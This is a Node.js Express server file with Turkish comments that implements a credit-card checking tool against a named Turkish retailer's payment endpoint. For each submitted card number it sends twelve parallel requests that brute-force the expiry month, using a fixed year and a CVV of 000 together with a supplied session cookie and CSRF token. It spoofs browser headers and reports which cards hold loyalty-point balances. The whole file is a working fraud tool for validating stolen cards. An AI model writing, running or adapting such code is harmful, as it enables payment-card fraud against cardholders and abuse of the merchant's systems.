// server.js
const express = require('express');
const { URLSearchParams } = require('url');
const fetch = require('node-fetch');
const cors = require('cors'); 
const app = express();
// Render için dinamik port kullanımı
const port = process.env.PORT || 3000; 

// Sabitler
const API_URL = "https://www.happy.com.tr/index.php?route=payment/creditcard/checkPoint";
const FIXED_YEAR = "2028";
const FIXED_CVV = "000";

// Orta katmanlar (Middleware)
app.use(cors());
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

/**
 * Tek bir kartı kontrol eder. Bu sefer 12 ayın tamamı PARALEL olarak kontrol edilir.
 */
async function checkSingleCard(cardNumber, headers, csrfToken) {
    
    // 12 ay için tüm Promise'leri (İstekleri) hazırlarız
    const monthPromises = [];
    const months = Array.from({ length: 12 }, (_, i) => (i + 1).toString().padStart(2, '0'));

    for (const month of months) {
        const data = {
            "banka": "akbank",
            "cardtype": "2",
            "cardname": "axess",
            "cc_cvv": FIXED_CVV,
            "taksit_sec": "1",
            "cc_number": cardNumber,
            "cc_month": month,
            "cc_year": FIXED_YEAR,
            "useAmountInt": "",
            "useAmountDecimal": "",
            "csrfToken": csrfToken 
        };
        const body = new URLSearchParams(data).toString();

        const promise = fetch(API_URL, {
            method: 'POST',
            headers: headers,
            body: body
        })
        .then(res => res.text()) // Yanıtı metin olarak al
        .then(text => {
            try {
                const result = JSON.parse(text);
                // Puan varsa sonucu döndür
                if (result && typeof result.amount === 'string' && parseFloat(result.amount) > 0) {
                    return { 
                        success: true, 
                        cardNumber: cardNumber,
                        expiry: `${month}/${FIXED_YEAR}`,
                        amount: result.amount
                    };
                }
            } catch (jsonError) {
                // JSON hatası veya puan yok
            }
            return null; // Puan yoksa null döndür
        })
        .catch(fetchError => {
            // console.error(`Fetch error for month ${month}: ${fetchError.message}`); // Hata logunu kapatıyoruz
            return null;
        });

        monthPromises.push(promise);
    }
    
    // Bütün 12 ayın isteklerinin PARALEL olarak tamamlanmasını bekle
    const results = await Promise.all(monthPromises);
    
    // Sonuçlar arasından puanı olan ilk kartı bul ve dön
    const robustResult = results.find(result => result && result.success);

    if (robustResult) {
        return robustResult;
    }
    
    // Puan bulunamadı.
    return { success: false, cardNumber: cardNumber, error: "Puan bulunamadı." };
}

/**
 * Express POST Rotası: Sadece TEK BİR KART kontrolünü yapar.
 */
app.post('/check_card', async (req, res) => {
    // Ön yüzden tekil kartı yakala (Rota: /check_card)
    const cardNumber = req.body.card; 
    
    const cookieHeader = req.header('x-app-cookie');
    const csrfTokenValue = req.header('x-app-csrf');

    if (!cookieHeader || !csrfTokenValue || !cardNumber) {
        return res.status(400).json({ error: "Eksik bilgi (Cookie, CSRF veya Kart Numarası)." });
    }

    const dynamicHeaders = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": cookieHeader,
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Origin": "https://www.happy.com.tr",
        "Referer": "https://www.happy.com.tr/index.php?route=checkout/checkout",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"
    };
    
    // Tek kartı kontrol et
    const result = await checkSingleCard(cardNumber, dynamicHeaders, csrfTokenValue);

    // Sonucu ön yüze geri gönder
    res.json(result);
});


// Statik dosyaları (index.html) sunmak için kök dizini ayarla
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.listen(port, () => {
    console.log(`🚀 Node.js Sunucusu port ${port} adresinde çalışıyor...`);
});
